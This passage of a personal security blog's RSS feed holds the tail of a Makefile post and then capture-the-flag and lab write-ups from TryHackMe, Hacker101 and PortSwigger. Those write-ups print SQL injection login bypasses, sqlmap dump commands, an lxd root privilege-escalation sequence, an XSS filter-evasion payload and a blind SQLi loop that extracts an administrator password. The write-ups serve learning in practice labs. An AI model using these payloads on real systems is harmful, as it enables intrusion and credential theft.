		rm -rf $(PUBLIC_DIR) &amp;&amp; echo "Local directory deleted"; \  
	fi  

# Build the site using Emacs  
build: clean  
	emacs -Q --script build-site.el  

# Add latest posts to /index.html  
add_latest_posts:  
	echo "Adding mini archive on /index.html"  
	echo '&lt;ul class="org-ul indexul"&gt;' &gt; /tmp/index  
	grep "^&lt;li&gt;" $(PUBLIC_DIR)/posts/recents.html | head -5 &gt;&gt; /tmp/index  
	echo '&lt;/ul&gt;' &gt;&gt; /tmp/index  
	sed -i -e '/Latest Articles&lt;\/a&gt;&lt;\/h2&gt;/r /tmp/index' $(PUBLIC_DIR)/index.html  

# Copy /index.html to /posts/index.html  
copy_index_to_posts:  
	echo "Copying /index to /posts/index"  
	cp $(PUBLIC_DIR)/index.html $(POSTS_DIR)/index.html  

# Build the site locally  
local: build add_latest_posts copy_index_to_posts  
</pre>

<p>
It did a great job, which I suppose is also due to the script’s clear, albeit  
not overly extensive, comments.  
</p>

<p>
Adding a new target and updating <code>local</code> completes the setup:  
</p>

<pre class="example" id="orga00b599">
# Serve the public directory on localhost using Python  
serve_local:  
	cd $(PUBLIC_DIR) &amp;&amp; python -m http.server  
</pre>
</div>
</div>
<div id="outline-container-orgf769cac" class="outline-2">
<h2 id="orgf769cac"><span class="section-number-2">4.</span> <a href="#orgf769cac">Completion</a></h2>
<div class="outline-text-2" id="text-4">
<p>
At this point, everything is working perfectly and is well-documented enough  
that I could refactor the entire blog. Spaghetti code is not just prevalent  
but is visible in its very structure and organization, making maintenance  
challenging. This Makefile makes things far more manageable.  
</p>
</div>
</div>
<div id="outline-container-org0ce0990" class="outline-2">
<h2 id="org0ce0990"><span class="section-number-2">5.</span> <a href="#org0ce0990">Some extra thoughts</a></h2>
<div class="outline-text-2" id="text-5">
<p>
It&rsquo;s truly fascinating that in <b>much less</b> than fifteen minutes, I managed to:  
</p>
<ul class="org-ul">
<li>Make a shell script obsolete.</li>
<li>Make another shell script obsolete, further reducing the mess I had  
embraced—and my discomfort along with it.</li>
<li>Better streamline the entire publishing process by creating a central file  
to manage it (the Makefile).</li>
<li>Write this simple article.</li>
</ul>

<p>
And all this with <b>minimal</b> experience in using and creating Makefiles. In  
fact, I initially considered writing one manually and even Googled <b>Makefile  
templates</b> before realizing what a waste of time that would be. Ah, what a  
wonderful and peculiar time to be alive!  
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>THM: Game Zone</title>
<link>posts/20231227_thm_game_zone.html</link>
<pubDate>Wed, 27 Dec 2023 08:11:00 +0200</pubDate>
<guid>posts/20231227_thm_game_zone.html</guid>
<description>
<![CDATA[<div id="outline-container-orgd90cd5b" class="outline-2">
<h2 id="orgd90cd5b"><span class="section-number-2">1.</span> <a href="#orgd90cd5b">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Take me to the <del>danger</del> game zone. Merry Christmas everyone, today is
yet another full day and I&rsquo;ll be trying to take the most out of it. 
</p>

<p>
Once again, I&rsquo;ve modified <code>/etc/hosts</code> and my local <code>bashrc</code> so that both
<code>gamezone.thm</code> and <code>$IP</code> point to the target machine
</p>
</div>
</div>
<div id="outline-container-org2fae9f1" class="outline-2">
<h2 id="org2fae9f1"><span class="section-number-2">2.</span> <a href="#org2fae9f1">Reconnaissance</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Starting with my go-to snippet for CTFs:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org7c7020a">nmap -sV -sC -oG nmap.initial $<span class="org-variable-name">IP</span>
</pre>
</div>

<p>
It shows 2 open ports:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> 22/ssh</li>
<li class="off"><code>[&#xa0;]</code> 80/http</li>
</ul>

<p>
Since we have no credentials checking the ssh server out is not so
promising, and due to that, I proceed to web enumeration, right after
starting the full scan (hoping it may give us something extra).
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org7983db9">nmap -p- -oG nmap.full -T4 $<span class="org-variable-name">IP</span>
</pre>
</div>
</div>
<div id="outline-container-orgcc06548" class="outline-3">
<h3 id="orgcc06548"><span class="section-number-3">2.1.</span> <a href="#orgcc06548">Web Enumeration</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Visiting the website (having already started Burp Proxy at the
background, to record everything and limited the scope appropriately),
we get a home page pointing to the Hitman games.
</p>


<div id="org8deec49" class="figure">
<p><img src="posts/images/Reconnaissance/20231227_084910_screenshot.png" alt="20231227_084910_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Hitman entry page</p>
</div>

<p>
Like always, more information (supposing it does not exceed a certain
limit where it becomes overwhelming), can&rsquo;t do any harm, so, I made
sure to run <code>gobuster</code> as well:
</p>

<div class="org-src-container">
<pre class="src src-bash" id="orgd9ff51a">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
</pre>
</div>

<p>
It did not reveal much, and <code>robots.txt</code> did not exist on the server, so
there was not a lot to check. Taken straight from our output:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> /.htpasswd (Status: 403)</li>
<li class="off"><code>[&#xa0;]</code> /.htaccess (Status: 403)</li>
<li class="off"><code>[&#xa0;]</code> /images (Status: 301)</li>
<li class="off"><code>[&#xa0;]</code> /server-status (Status: 403)</li>
</ul>

<p>
Since the room <b>points</b> to SQLi, this is our next step.
</p>
</div>
</div>
</div>
<div id="outline-container-org554d73a" class="outline-2">
<h2 id="org554d73a"><span class="section-number-2">3.</span> <a href="#org554d73a">SQLi</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Now, we see that in each request there is a line in the following
form:
</p>
<pre class="example" id="org925c5b6">
username=reqwer&amp;password=qwerqwer&amp;x=18&amp;y=7
</pre>

<p>
Sending that to intruder to test our payloads hassle free. <del>Sadly, which I also realized when I manually tested this random combination you can see above, no error message is vis</del>
</p>


<div id="org054d4e6" class="figure">
<p><img src="posts/images/SQLi/20231227_090646_screenshot.png" alt="20231227_090646_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>Subtle Error</p>
</div>

<p>
No error is visibly caused by my sample injection payloads (just
testing the usual as found in <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#summary">PayloadsAllTheThings</a>), when testing the
username field, so moving on to password. Same behavior there, so it
is possible that the selected payloads are just not good enough (?).
</p>

<p>
Heading back to the room&rsquo;s page, however, it suggested that we leave
the second field blank (should have thought of that by myself).
</p>

<p>
Tinkering just a little bit there I got this that worked:
</p>
<pre class="example" id="orge7e9c96">
username=' or 1=1; ---&amp;password=&amp;x=0&amp;y=
</pre>

<p>
Using that in our browser we get access to <i>Game Zone Portal</i>
</p>
</div>
<div id="outline-container-org2883005" class="outline-3">
<h3 id="org2883005"><span class="section-number-3">3.1.</span> <a href="#org2883005">Game Zone Portal</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
Still taking advantage of Burp Suite Proxy, I&rsquo;m trying different
payloads on the Portal&rsquo;s input field, to see what I can get:
</p>
<ul class="org-ul">
<li>An error shows that the backend is MySQL, which I plan to take
advantage of.</li>
<li>After just a little manual enumeration, I decided to follow the
room&rsquo;s advice<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>and move on with sqlmap.</li>
</ul>
</div>
</div>
<div id="outline-container-org3d8d4a3" class="outline-3">
<h3 id="org3d8d4a3"><span class="section-number-3">3.2.</span> <a href="#org3d8d4a3">SQLmap</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
It worked smoothly, giving us both the posts that I had already found
<b>and</b> a hash:username combination.
</p>

<div class="org-src-container">
<pre class="src src-bash" id="orgf1571d8">sqlmap -r request.txt --dbms mysql --dump
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-org59f9d62" class="outline-2">
<h2 id="org59f9d62"><span class="section-number-2">4.</span> <a href="#org59f9d62">Password Cracking</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Going to my john notes and just running john against gave me the
password, I suspect just using the suggested command would be fine as well.
</p>
</div>
</div>
<div id="outline-container-org68b8366" class="outline-2">
<h2 id="org68b8366"><span class="section-number-2">5.</span> <a href="#org68b8366">Initial Foothold</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Knowing the user:password combination we can safely login as <code>agent47</code>:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgd934f33">ssh agent47@gamezone.thm
</pre>
</div>

<p>
After logging in I thought it might be beneficial to try my techniques
for privilege escalation, however the basics turned out to be properly
configured so no low-hanging fruit for me there.
</p>

<p>
In any case, I wanted to avoid using <code>metasploit</code> and the suggested
technique before attempting to do it myself, so I ran <code>linpeas</code> and
while checking the output out, I noticed something I had seen in a CTF
a long time ago, when I could not understand it so well: <code>(lxd)</code> group
membership can usually be translated into root privileges.
</p>

<p>
Heading to <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">HackTricks</a>, I carefully went for <code>method 2</code>, and babbity
bibbity boop, I became root :P!
</p>

<p>
Some snippets that I used can be found below, missing the parts where
I used scp to copy the tar.gz files to the target machine, and the
initialization that took place in my local machine. I did not deviate
(at all) from the playbook&rsquo;s commands so it is easy for anyone to just
follow the link and perform the same privesc.
</p>
<pre class="example" id="org5e882a6">
agent47@gamezone:~$ lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
Image imported with fingerprint: 78495f763d90135702f6430685b5cc0f14255034c8fccda355791263fdf49354
agent47@gamezone:~$ lxd init
error: You have existing containers or images. lxd init requires an empty LXD.
agent47@gamezone:~$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
agent47@gamezone:~$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
error: Container 'mycontainer' already exists
agent47@gamezone:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
agent47@gamezone:~$ lxc start mycontainer
agent47@gamezone:~$ lxc exec mycontainer /bin/sh
</pre>
</div>
</div>
<div id="outline-container-org612e9d0" class="outline-2">
<h2 id="org612e9d0"><span class="section-number-2">6.</span> <a href="#org612e9d0">Thoughts</a></h2>
<div class="outline-text-2" id="text-6">
<p>
This was the first time I performed port forwarding with ssh (even
though it did not help me at all. I just did it to get the cms flags -
searching the CMS&rsquo;s configuration files locally for some reason gave
me a totally different version than the one online.), <b>BUT</b> I really
liked playing around with it and enjoyed it.
</p>

<p>
Now as far as the room is concerned, it had the perfect balance for
me, not too difficult and with quite some stuff worth checking out. It
has a <i>walkthrough</i> type of character, however, which I have come to
dislike, and that is the main reason why I tried my best not to look
at it, before getting something that <i>could</i> be a flag.
</p>

<p>
Highly recommended!
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Having used sqlmap a couple times before I was <b>amazed</b> to see
the <code>-r</code> option. Well played on that one, definitely planning on reusing
it later on.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>HackerOne: CTF: Micro-CMS</title>
<link>posts/20240121_hackerone_ctf_challenges.html</link>
<pubDate>Sun, 21 Jan 2024 20:38:00 +0200</pubDate>
<guid>posts/20240121_hackerone_ctf_challenges.html</guid>
<description>
<![CDATA[<div id="outline-container-orgf9bcae6" class="outline-2">
<h2 id="orgf9bcae6"><span class="section-number-2">1.</span> <a href="#orgf9bcae6">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Hello World! Long time no see! After taking a break from writing, to
focus on the rest of my responsibilities and tasks, I&rsquo;m back with
another small walkthrough on my latest set of mini cybersec challenges.
</p>

<p>
Having canceled my THM subscription<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>, I went back to my ebook
library, to start ticking off some more books from those included in
my <i>carefully picked</i> humble bundles. I started reading <a href="https://www.amazon.com/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities-ebook/dp/B08YK368Y3">Li&rsquo;s Bug Bounty
Bootcamp</a>. It has been incredible so far and (maybe due to the
twisted way my mind works :P) inspiring.
</p>

<p>
It made me want to put some effort in what could be considered my
weakest aspect in cyber security testing, web security. I intend to
focus on this field for the next couple of months, building a solid
foundation so that I can later use these skills more widely. Along
with the book, I decided to get practical, creating a HackerOne
account, and doing some <a href="https://ctf.hacker101.com/">Hacker101</a> challenges. Here is one of those I
have since completed.
</p>
</div>
</div>
<div id="outline-container-org40e2be9" class="outline-2">
<h2 id="org40e2be9"><span class="section-number-2">2.</span> <a href="#org40e2be9">Testing</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Heading to the website we can see that there are some pre-existing
articles, and we can freely create some ourselves. Since it was (is?)
the first time I am using my own set up and not some preconfigured
distro/complete installation to practice Web Recon (and exploitation),
I decided to make it harder: not only by limiting the tools to those
already installed (namely a proper burp suite community installation,
along with my programming setup), but also by using python to automate
any tasks I wanted to automate.
</p>

<p>
Brushing up python can not possibly hurt.
</p>



<div class="note" id="orgd788269">
<p>
This definitely should not be listed as a fuzzer but, well.
</p>

</div>
<p>
Seeing that the (first) article I created had an <i>id</i> of 8 (thus
existed in <code>/page/8</code>) without that many articles being apparent, I
thought it might be interesting to check for other <i>ids</i>.
Instead of doing that with an already-existing fuzzer, I shall do it in python
(and literate programming for that matter :P):
</p>
<ul class="org-ul">
<li>Check all pages from 1 to 10, paying attention to the status codes
to see if they existed</li>
</ul>




<div class="org-src-container">
<pre class="src src-python" id="org1895a64"><span class="org-comment-delimiter"># </span><span class="org-comment">Snippet to open all pages in my browser</span>
<span class="org-comment-delimiter"># </span><span class="org-comment">Verdict: Inefficient and illogical, I only want to get the interesting pages</span>
<span class="org-keyword">import</span> webbrowser

<span class="org-keyword">for</span> article <span class="org-keyword">in</span> <span class="org-builtin">range</span>(1,10):
    webbrowser.<span class="org-builtin">open</span>(<span class="org-string">'placeholder-link'</span> <span class="org-operator">+</span><span class="org-builtin">str</span>(article))

</pre>
</div>

<p>
Or, in a more convenient manner, allowing for our requests to be
stored within Burp Suite as well: 
</p>
<div class="org-src-container">
<pre class="src src-python" id="org7158d17"><span class="org-comment-delimiter"># </span><span class="org-comment">Snippet to open all pages virtually in python, utilizing burp at the same time</span>
<span class="org-comment-delimiter"># </span><span class="org-comment">Verdict: The way to go, quickly getting the results I want without messing with GUI</span>

<span class="org-keyword">import</span> requests

<span class="org-variable-name">result</span> <span class="org-operator">=</span> []
<span class="org-variable-name">proxy</span><span class="org-operator">=</span>{<span class="org-string">'https'</span>: <span class="org-string">'127.0.0.1:8080'</span>}
<span class="org-variable-name">mylink</span><span class="org-operator">=</span><span class="org-string">'placeholder'</span> <span class="org-comment-delimiter"># </span><span class="org-comment">For easier modification</span>

<span class="org-keyword">for</span> article <span class="org-keyword">in</span> <span class="org-builtin">range</span>(1,10):
    <span class="org-keyword">try</span>:
        <span class="org-variable-name">resp</span> <span class="org-operator">=</span> requests.get(mylink<span class="org-operator">+</span><span class="org-builtin">str</span>(article),
                            verify<span class="org-operator">=</span><span class="org-constant">False</span>, <span class="org-comment-delimiter"># </span><span class="org-comment">Avoid self-signed certificate errors</span>
                            proxies<span class="org-operator">=</span>proxy,
                            allow_redirects<span class="org-operator">=</span><span class="org-constant">True</span>,)
        <span class="org-keyword">if</span> resp.status_code <span class="org-operator">!=</span> 404:
            <span class="org-comment-delimiter"># </span><span class="org-comment">We do not care about 404s</span>
            result.append(f<span class="org-string">"Intersting! </span>{resp.status_code}<span class="org-string">: Article </span>{article}<span class="org-constant">\n</span><span class="org-string">"</span>)
    <span class="org-keyword">except</span> <span class="org-type">Exception</span> <span class="org-keyword">as</span> e:
        <span class="org-keyword">return</span>(<span class="org-string">"Noice:"</span>, e)

<span class="org-keyword">return</span> result
</pre>
</div>

<pre class="example" id="org8be7d8d">
#+RESULTS: Smarter Implementation
| Intersting! 200: Article 1\n | Intersting! 200: Article 2\n | Intersting! 403: Article 6\n | Intersting! 200: Article 8\n |
</pre>

<p>
The code itself is not spectacular (in fact I could not even write its
output without making a spelling mistake one might notice), but allows
us to witness an abnormality: <b>Post 6 gives us 403: forbidden</b>
</p>



<div id="orgac7a77f" class="figure">
<p><img src="posts/images/Testing/20240121_210542_screenshot.png" alt="20240121_210542_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Good ol&rsquo; opencat function becomes handy when writing such posts</p>
</div>
</div>
</div>
<div id="outline-container-org438ee41" class="outline-2">
<h2 id="org438ee41"><span class="section-number-2">3.</span> <a href="#org438ee41">XSS</a></h2>
<div class="outline-text-2" id="text-3">
<p>
My first thought, seeing a lot of input fields was to check for
self-XSS on what was already available to me:
</p>
<ul class="org-ul">
<li>On a new post&rsquo;s title</li>
<li>On a new post&rsquo;s contents</li>
</ul>

<p>
Getting an <code>alert(1)</code> inside the title, simple enough, rewards us with a
flag. No check is present there, unlike the contents box, where script
gets substituted with scrubbed, not allowing the code to run without
some evasion trick. Luckily, <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">OWASP XSS Filter Evasion Cheatsheet</a>
has some tricks we can use, getting the another flag.
</p>

<p>
At this point we have flags 2,3, searching for 1,2.
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span class="org-function-name">IMG</span> SRC=/ <span class="org-variable-name">onerror</span>=<span class="org-string">"alert(1)"</span>&gt;&lt;/<span class="org-function-name">img</span>&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-org3d09389" class="outline-2">
<h2 id="org3d09389"><span class="section-number-2">4.</span> <a href="#org3d09389">Getting access to the forbidden file</a></h2>
<div class="outline-text-2" id="text-4">
<p>
I was so sure that the answer to bypassing the 403 there would be
something extremely silly&#x2026; and it was :P. Just heading to the
respective <code>/edit</code> page and we can get what we want. Now flag 2 is all we
want to <i>wrap</i> this mini challenge.
</p>
</div>
</div>
<div id="outline-container-orge5c646d" class="outline-2">
<h2 id="orge5c646d"><span class="section-number-2">5.</span> <a href="#orge5c646d">Not-so-good SQLi</a></h2>
<div class="outline-text-2" id="text-5">
<p>
This bothered me a lot, not knowing where to look and what to pay
attention to. After feeling like I was hitting my head against a wall
for more than 20 minutes, I saw <a href="https://www.youtube.com/watch?v=oHPuW5NU2wk">Tib3rius</a> video on the room, in which
even though this flag is not revealed, I got a great idea on how to go
looking for it: SQL injection on the different pages. It worked on the
first I tried.
</p>


<p>
May seem silly, but for some reason I had not given this possibility a
thought till that moment&#x2026; Will do from now on.
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Probably just for the time being, knowing that I would not take
much advantage of it since I will be focusing increasingly more in
getting fully caught up with ECE.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>WSA: Blind SQL Injection with conditional errors</title>
<link>posts/20240213_wsa_blind_sql_injection_with_conditional_errors.html</link>
<pubDate>Tue, 13 Feb 2024 11:22:00 +0200</pubDate>
<guid>posts/20240213_wsa_blind_sql_injection_with_conditional_errors.html</guid>
<description>
<![CDATA[<div id="outline-container-org01b04b4" class="outline-2">
<h2 id="org01b04b4"><span class="section-number-2">1.</span> <a href="#org01b04b4">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
I feel like much of the process I made during the last year, even
though significant was disorganized and chaotic. I have reached a
level where I can read (/study) cybersecurity research and articles
with increasing comfort, having a solid background on most terms, but
at the same time, my practical knowledge on most of those is greatly
underdeveloped. To tackle that, I selected a field to focus on for
this semester, expecting a certain degree of proficiency at the end of
it that I can (at least pretend to) participate in a bug bounty
program and solve related CTF challenges.
</p>

<p>
Starting with SQL injections.
</p>
</div>
</div>
<div id="outline-container-org9058509" class="outline-2">
<h2 id="org9058509"><span class="section-number-2">2.</span> <a href="#org9058509">Web Security Academy</a></h2>
<div class="outline-text-2" id="text-2">
<p>
<a href="https://portswigger.net/web-security/dashboard">Web Security Academy</a> has been a very interesting integration to my
<i>studying</i> routine, allowing for easily deployable labs, directly from
my browser, which I can access without the need of a <code>VPN</code>. Having a
basic Web lab configured locally, they allow me to test different
ideas freely, <span class="underline">without much friction</span>.
</p>

<p>
Stating this here, I aim to complete at least 210 labs (roughly 80% of
the ones available in the website) by the end of May.
</p>
</div>
</div>
<div id="outline-container-org6933e1a" class="outline-2">
<h2 id="org6933e1a"><span class="section-number-2">3.</span> <a href="#org6933e1a">The process</a></h2>
<div class="outline-text-2" id="text-3">
<p>
&rsquo;nough said, let&rsquo;s dive into the lab. 
</p>
</div>
<div id="outline-container-org1396288" class="outline-3">
<h3 id="org1396288"><span class="section-number-3">3.1.</span> <a href="#org1396288">Finding the SQLi point</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
Knowing that this is a lab with a SQLi vulnerability, I just loaded
the page on my browser, revealing a familiar page from previously
completed (<i>yet undocumented from my part</i>) labs. After 2 minutes in
manual navigation, I had collected enough requests for me in Burp
Suite to be able to work solely through <code>Repeater</code>:
</p>
<ul class="org-ul">
<li class="on"><code>[X]</code> Testing <code>parameter</code>: We see that tinkering around leaves no trace of
a potential SQLi.</li>
<li class="on"><code>[X]</code> Testing the cookie: As seen in the image below&#x2026; we know where to
look at.</li>
</ul>


<div id="orgc110fdc" class="figure">
<p><img src="posts/images/20240213_112605_screenshot.png" alt="20240213_112605_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>SQLi POC</p>
</div>
</div>
</div>
<div id="outline-container-org91a863f" class="outline-3">
<h3 id="org91a863f"><span class="section-number-3">3.2.</span> <a href="#org91a863f">Finding the SQL backend</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
Now, knowing that we have to manipulate the value of <code>TrackingID</code>
cookie, we need to gather some more information about the underlying
system. Using simple <code>AND</code> queries does not seem to give us much
information, since the output of our commands is not shown in the
response, but adding <code>UNION SELECT</code> means increased versatility.
</p>

<p>
Namely the process followed here was:
</p>
<ul class="org-ul">
<li class="on"><code>[X]</code> Get a simple <code>AND</code> query to return 200
<ul class="org-ul">
<li><code>' and 'a'='a'--</code></li>
</ul></li>
<li class="on"><code>[X]</code> Insert a <code>SELECT</code> there to see how the DBMS handles those
<ul class="org-ul">
<li><code>(SELECT 'a')='a'--</code> fails, for no apparent reason</li>
<li><code>(SELECT 'a' from dual)='a'--</code> and we&rsquo;re good to go, an obvious sign
that we are facing Oracle DBMS</li>
</ul></li>
</ul>



<div id="org9595aea" class="figure">
<p><img src="posts/images/20240213_112905_screenshot.png" alt="20240213_112905_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>Oracle DBMS poc</p>
</div>
</div>
</div>
<div id="outline-container-org5183e50" class="outline-3">
<h3 id="org5183e50"><span class="section-number-3">3.3.</span> <a href="#org5183e50">Developing a base condition</a></h3>
<div class="outline-text-3" id="text-3-3">
<p>
Getting into our arsenal (<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQLi Cheatsheet</a>), we insert a <code>CASE</code>
statement, and a division by zero to throw an exception when the
condition is met. Using this general syntax will allow us in the next
steps to get more information about the target system, since it
effectively translates into:
</p>
<ul class="org-ul">
<li>500 return code -&gt; condition true</li>
<li>200 return code -&gt; condition false</li>
</ul>


<div id="org75ca99b" class="figure">
<p><img src="posts/images/20240213_113037_screenshot.png" alt="20240213_113037_screenshot.png">
</p>
<p><span class="figure-number">Figure 3: </span>Getting the DBMS to throw an error</p>
</div>
</div>
</div>
<div id="outline-container-org9b21564" class="outline-3">
<h3 id="org9b21564"><span class="section-number-3">3.4.</span> <a href="#org9b21564">Validating the existence of specifics</a></h3>
<div class="outline-text-3" id="text-3-4">
<p>
Our goal is to get the password of the <code>administrator</code> account but first
we need to verify some data:
</p>
<ul class="org-ul">
<li class="on"><code>[X]</code> Validating the existence of the <code>users</code> table</li>
<li class="on"><code>[X]</code> Validating the existence of <code>user</code>: administrator</li>
<li class="on"><code>[X]</code> Validating the existence of the <code>password</code> column</li>
</ul>

<p>
These were mostly completed as shown here:
</p>
<pre class="example" id="org3971a7b">
TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE null END FROM users--
TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE password END FROM users--
TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE password END FROM users WHERE username='administrator'--
</pre>
</div>
</div>
<div id="outline-container-orga9da41b" class="outline-3">
<h3 id="orga9da41b"><span class="section-number-3">3.5.</span> <a href="#orga9da41b">Getting info about password</a></h3>
<div class="outline-text-3" id="text-3-5">
<p>
Pay attention to how my payload has slightly changed from the previous
&ldquo;examples&rdquo;, and <b>special emphasis</b> should be given to the <code>from dual</code>
part, since forgetting it causes 500 (oracle DBMS).
</p>
</div>
<div id="outline-container-org19eac9d" class="outline-4">
<h4 id="org19eac9d"><span class="section-number-4">3.5.1.</span> <a href="#org19eac9d">Password Length</a></h4>
<div class="outline-text-4" id="text-3-5-1">
<p>
To get the length of the password field for the entry with
<code>username='administrator'</code>, we can rely on the builtin function <code>LENGTH</code>
Through <i>binary</i> search, starting from an obviously unrealistic (for a
challenge at least) length of 100, we got that password length for
administrator is 20 characters:
</p>

<pre class="example" id="orgdff04c8">
TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT 'a' from users where username='administrator' and LENGTH(password)&gt;0)='a') THEN 'a' ELSE TO_CHAR(1/0) END from dual--
Cookie: TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT 'a' from users where username='administrator' and LENGTH(password)&lt;100)='a') THEN 'a' ELSE TO_CHAR(1/0) END from dual--;
</pre>



<div id="orgc935400" class="figure">
<p><img src="posts/images/20240213_114312_screenshot.png" alt="20240213_114312_screenshot.png">
</p>
<p><span class="figure-number">Figure 4: </span>Password Length Query</p>
</div>

<p>
This means that we need to get 20 characters
</p>
</div>
</div>
<div id="outline-container-org35c3d0a" class="outline-4">
<h4 id="org35c3d0a"><span class="section-number-4">3.5.2.</span> <a href="#org35c3d0a">Password Contents</a></h4>
<div class="outline-text-4" id="text-3-5-2">
<p>
Since I use Burp Community Edition I know that to get the password
will take a fair share of my lifetime, should I stick with the
<i>confined</i> version of <code>Intruder</code>. To make up for it, I decided to run a
simple loop with python. Namely:
</p>

<div class="org-src-container">
<pre class="src src-python"><span class="org-variable-name">password</span> <span class="org-operator">=</span> <span class="org-string">""</span>

<span class="org-keyword">for</span> index <span class="org-keyword">in</span> <span class="org-builtin">range</span>(1,21):
    <span class="org-keyword">for</span> letter <span class="org-keyword">in</span> string.lowercase <span class="org-operator">+</span> string.digits:
        <span class="org-variable-name">req</span> <span class="org-operator">=</span> send.request() <span class="org-comment-delimiter"># </span><span class="org-comment">Pseudocode</span>
        <span class="org-keyword">if</span> reg.status_code <span class="org-operator">==</span> 500:
            <span class="org-variable-name">password</span> <span class="org-operator">+=</span> letter
            <span class="org-keyword">break</span>
</pre>
</div>

<p>
The request is built and sent using <code>python</code>&rsquo;s builtin <code>requests</code> library,
allowing through the usage of <code>proxies</code>, to have the requests sent to
burp as well<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>, while its payload is in the form of:
</p>

<pre class="example" id="org067280e">
'Cookie': f"TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT SUBSTR(password,{index},1) from users where username='administrator') ='{letter}') THEN TO_CHAR(1/0) ELSE null END from dual--; session=ImL77SPyy3Ne4HwEqb2Bnu2HFhIR18Vp",
</pre>

<p>
Notice that:
</p>
<ul class="org-ul">
<li>It is in the format of a python dictionary</li>
<li>I <span class="underline">still</span> use <code>dual</code></li>
<li>Usage of &rsquo;&rsquo; outside of {letter}, otherwise the requests get all invalidated.</li>
</ul>

<p>
This beautifully automates the process allowing me to get a:
</p>


<div id="orga08c90f" class="figure">
<p><img src="posts/images/20240213_115634_screenshot.png" alt="20240213_115634_screenshot.png">
</p>
<p><span class="figure-number">Figure 5: </span>BEAUTIFULLLLLLL</p>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-org06fcd35" class="outline-2">
<h2 id="org06fcd35"><span class="section-number-2">4.</span> <a href="#org06fcd35">Summary</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Do not make the mistake of overlooking these labs. They have been
really fun to play with, and I feel like I have already learned so
much new about SQLi &#x2026;
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Critical when debugging payload mistakes 
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>WSA: Visible Error-Based SQLi</title>
<link>posts/20240214_wsa_visible_error_based_sqli.html</link>
<pubDate>Wed, 14 Feb 2024 22:12:00 +0200</pubDate>
<guid>posts/20240214_wsa_visible_error_based_sqli.html</guid>
<description>
<![CDATA[<div id="outline-container-org88c4728" class="outline-2">
<h2 id="org88c4728"><span class="section-number-2">1.</span> <a href="#org88c4728">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
We are given this task:
</p>
<blockquote>
<p>
The database contains a different table called users, with columns
called username and password. To solve the lab, find a way to leak the
password for the administrator user, then log in to their account.
</p>
</blockquote>

<p>
